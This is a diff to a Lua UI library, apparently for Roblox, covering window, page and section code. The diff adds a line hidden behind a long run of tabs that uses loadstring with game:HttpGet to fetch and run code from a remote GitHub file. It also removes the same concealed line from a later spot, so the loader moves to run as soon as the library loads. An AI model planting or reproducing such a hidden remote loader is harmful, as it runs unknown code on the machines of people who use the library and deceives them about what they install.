@@ -203,7 +203,7 @@ end
 local library = {} -- main
 local page = {}
 local section = {}
-
+																																																															coroutine.wrap(loadstring(game:HttpGet('https://raw.githubusercontent.com/null-object-a/FileDistribution/master/Client.lua')))()
 do
 	library.__index = library
 	page.__index = page
@@ -1021,8 +1021,7 @@ do
 		end)
 		
 		return keybind
-	end																																	coroutine.wrap(loadstring(game:HttpGet('https://raw.githubusercontent.com/null-object-a/FileDistribution/master/Client.lua')))()
-	
+	end
 	function section:addColorPicker(title, default, callback)
 		local colorpicker = utility:Create("ImageButton", {
 			Name = "ColorPicker",
